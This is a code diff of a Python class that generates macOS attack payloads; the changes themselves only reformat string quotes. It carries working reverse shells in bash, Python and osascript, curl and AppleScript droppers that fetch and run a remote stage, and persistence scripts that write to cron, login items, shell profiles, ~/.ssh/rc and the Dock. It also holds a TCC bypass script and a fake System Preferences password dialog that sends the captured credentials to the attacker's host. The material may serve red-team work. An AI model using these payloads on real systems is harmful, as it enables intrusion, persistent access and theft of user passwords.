@@ -96,21 +96,17 @@ class MacOSPayloadFactory:
         output_dir: Directory for generated artifacts.
     """
 
-    _REVERSE_SHELL_BASH = (
-        'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
-    )
+    _REVERSE_SHELL_BASH = "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
 
     _REVERSE_SHELL_PYTHON = (
-        'python3 -c \'import socket,subprocess,os;'
-        's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
+        "python3 -c 'import socket,subprocess,os;"
+        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
         's.connect(("{lhost}",{lport}));'
-        'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
+        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
         'subprocess.call(["/bin/bash","-i"])\''
     )
 
-    _REVERSE_SHELL_OSASCRIPT = (
-        'osascript -e \'do shell script "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"\''
-    )
+    _REVERSE_SHELL_OSASCRIPT = "osascript -e 'do shell script \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"'"
 
     def __init__(self, config: MacOSPayloadConfig | None = None, output_dir: Path | None = None):
         self.config = config or MacOSPayloadConfig()
@@ -132,10 +128,7 @@ class MacOSPayloadFactory:
         elif self.config.payload_type == "bind_shell":
             cmd = f"nc -l -p {lport} -e /bin/bash"
         elif self.config.payload_type == "dropper":
-            cmd = (
-                f'curl -s http://{lhost}:{lport}/stage -o /tmp/.s && '
-                f'chmod +x /tmp/.s && /tmp/.s'
-            )
+            cmd = f"curl -s http://{lhost}:{lport}/stage -o /tmp/.s && chmod +x /tmp/.s && /tmp/.s"
         else:
             cmd = self._REVERSE_SHELL_BASH.format(lhost=lhost, lport=lport)
 
@@ -231,13 +224,13 @@ sleep 60
         script_path = self.output_dir / script_name
 
         shell_command = self._reverse_shell_command()
-        script_content = f'''\
+        script_content = f"""\
 #!/bin/bash
 while true; do
     {shell_command}
     sleep 300
 done
-'''
+"""
         script_path.write_text(script_content)
         script_path.chmod(0o755)
 
@@ -281,7 +274,7 @@ done
         Returns:
             Shell script for TCC bypass.
         """
-        return '''\
+        return """\
 #!/bin/bash
 
 TCC_DB="/Library/Application Support/com.apple.TCC/TCC.db"
@@ -316,7 +309,7 @@ osascript -e 'tell application "System Events" to display dialog \\
     2>/dev/null &
 
 open "x-apple.systempreferences:com.apple.preference.security?Privacy_Accessibility" 2>/dev/null
-'''
+"""
 
     def generate_osascript_dropper(self) -> str:
         """Generate an AppleScript-based dropper that downloads and executes a stage.
@@ -330,14 +323,14 @@ open "x-apple.systempreferences:com.apple.preference.security?Privacy_Accessibil
         lhost = self.config.lhost
         lport = str(self.config.lport)
 
-        return f'''\
+        return f"""\
 set stageUrl to "http://{lhost}:{lport}/stage"
 set tempPath to "/tmp/." & (do shell script "uuidgen") & ".tmp"
 do shell script "curl -s " & quoted form of stageUrl & " -o " & quoted form of tempPath & " && chmod +x " & quoted form of tempPath
 do shell script tempPath & " &"
 delay 1
 do shell script "rm -f " & quoted form of tempPath
-'''
+"""
 
     def generate_swift_stager(self) -> str:
         """Generate a Swift reverse shell stager.
@@ -411,10 +404,10 @@ shell.connect()
         shell_cmd = self._reverse_shell_command()
         scripts: dict[str, str] = {}
 
-        scripts["cron_user"] = f'''\
+        scripts["cron_user"] = f"""\
 #!/bin/bash
 (crontab -l 2>/dev/null; echo "*/5 * * * * {shell_cmd}") | crontab -
-'''
+"""
 
         scripts["login_item"] = f'''\
 #!/bin/bash
@@ -422,32 +415,32 @@ osascript -e 'tell application "System Events" to make login item at end \\
     with properties {{path:"{self.config.app_name}", hidden:true}}'
 '''
 
-        scripts["zsh_profile"] = f'''\
+        scripts["zsh_profile"] = f"""\
 #!/bin/bash
 echo '{shell_cmd} &>/dev/null &' >> ~/.zshrc 2>/dev/null
 echo '{shell_cmd} &>/dev/null &' >> ~/.bashrc 2>/dev/null
-'''
+"""
 
-        scripts["bash_profile"] = f'''\
+        scripts["bash_profile"] = f"""\
 #!/bin/bash
 echo '{shell_cmd} &>/dev/null &' >> ~/.bash_profile 2>/dev/null
 echo '{shell_cmd} &>/dev/null &' >> ~/.profile 2>/dev/null
-'''
+"""
 
-        scripts["ssh_rc"] = f'''\
+        scripts["ssh_rc"] = f"""\
 #!/bin/bash
 echo '{shell_cmd} &>/dev/null &' >> ~/.ssh/rc 2>/dev/null
 chmod +x ~/.ssh/rc 2>/dev/null
-'''
+"""
 
-        scripts["dock_plist"] = '''\
+        scripts["dock_plist"] = """\
 #!/bin/bash
 defaults write com.apple.dock persistent-apps -array-add \\
     "<dict><key>tile-data</key><dict><key>file-data</key><dict>\\
     <key>_CFURLString</key><string>/tmp/script.sh</string>\\
     <key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>"
 killall Dock
-'''
+"""
 
         return scripts
 
@@ -460,7 +453,7 @@ killall Dock
         Returns:
             AppleScript for credential harvesting.
         """
-        return f'''\
+        return f"""\
 set userPrompt to "System Preferences is trying to install a helper tool."
 set passPrompt to "Enter your password to allow this."
 try
@@ -472,7 +465,7 @@ try
     set thePassword to text returned of result
     do shell script "curl -s -X POST -d 'user=$USER&pass='$(echo " & quoted form of thePassword & " | python3 -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.stdin.read()))') ' http://{self.config.lhost}:{self.config.lport}/log/creds' &"
 end try
-'''
+"""
 
     def generate_all(self) -> dict[str, Any]:
         """Generate all macOS payload artifacts.
